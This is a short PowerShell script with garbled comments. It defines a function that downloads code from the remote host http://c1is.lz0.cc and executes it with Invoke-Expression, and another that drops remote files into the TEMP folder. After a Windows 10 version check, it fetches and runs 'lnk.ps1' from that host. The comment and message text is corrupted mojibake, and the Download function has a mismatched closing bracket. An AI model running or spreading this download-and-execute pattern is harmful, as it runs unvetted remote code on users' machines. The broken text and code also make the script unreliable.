$Web = "http://c1is.lz0.cc"
$Temp = $env:TEMP

# ���� "call" ���������ڵ��ñ��ʽ
Function Call($_v) {iex (New-Object System.Net.WebClient).DownloadString("$Web/expression/$_v")}

# ���� "Download" ���������������ļ�
Function Download($_v) {iwr -uri "$Web/$_v" -OutFile "$Temp/$_v")

# ��� Windows �汾 = 10
if($PSVersionTable.BuildVersion.Major -lt 10)
{
    Write-Warning "�Բ��𣬴����ݿ��������΢�� Windows 10 ����ϵͳ���������ڸ��Ļ��������ϵͳ�汾������..."
    Start-Sleep -Seconds 3
    Read-Host "�� Enter ���˳�..."
    break
}

if(!$LUserName)
{
    write "Hello"
    call "lnk.ps1"
}